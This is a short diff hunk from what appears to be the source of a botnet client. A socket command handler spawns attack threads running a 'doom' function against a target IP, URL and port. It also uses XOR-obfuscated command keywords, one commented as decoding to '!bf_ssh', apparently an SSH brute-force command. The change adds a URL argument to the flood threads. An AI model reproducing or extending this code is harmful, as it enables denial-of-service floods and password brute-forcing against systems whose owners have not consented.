@@ -174,8 +174,8 @@ def handle(sock):
 						stop = True
 						attack =0
 					stop= False
-					for _ in range(int(command[2])):
-						p= threading.Thread(target=doom, args = (command[1],))
+					for _ in range(int(command[3])):
+						p= threading.Thread(target=doom, args = (command[1], command[2]))#1=ip, 2=url 3=port
 						p.start()
 					attack+=1
 				elif command[0] == xor_dec('QBECORQbAg==',key):#encoded keyword: !bf_ssh
